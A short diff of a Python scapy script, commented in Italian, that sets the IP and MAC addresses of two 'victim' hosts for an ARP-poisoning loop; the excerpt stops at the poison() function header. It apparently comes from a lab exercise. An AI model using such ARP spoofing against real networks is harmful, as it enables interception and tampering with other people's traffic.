@@ -1,8 +1,8 @@
 from scapy.all import *
 import time
 # IP e MAC delle vittime
-client_ip, client_mac = "192.168.90.101", "9e:81:da:92:9c:27"
-server_ip, server_mac = "192.168.90.100", "f6:b6:46:10:66:b0"
+client_ip, client_mac = "192.168.90.101", "02:42:ac:11:00:bb"
+server_ip, server_mac = "192.168.90.100", "02:42:ac:11:00:cc"
 # Invia pacchetti ARP falsi in loop
 def poison():
     while True:
